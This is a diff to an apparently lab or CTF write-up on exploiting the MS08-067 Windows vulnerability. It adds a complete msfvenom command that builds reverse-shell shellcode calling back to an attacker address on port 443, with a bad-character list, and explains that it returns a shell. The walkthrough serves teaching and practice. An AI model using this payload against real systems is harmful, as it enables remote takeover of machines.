@@ -8,7 +8,11 @@ https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-0
 
 ### Shellcode Generation
 
-To make the shellcode, We will use `msfvenom`. 
+We will use `msfvenom` to genarate the shellcode.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+```
 
 ```
 -p windows/shell_reverse_tcp - This will connect back to me with a shell.
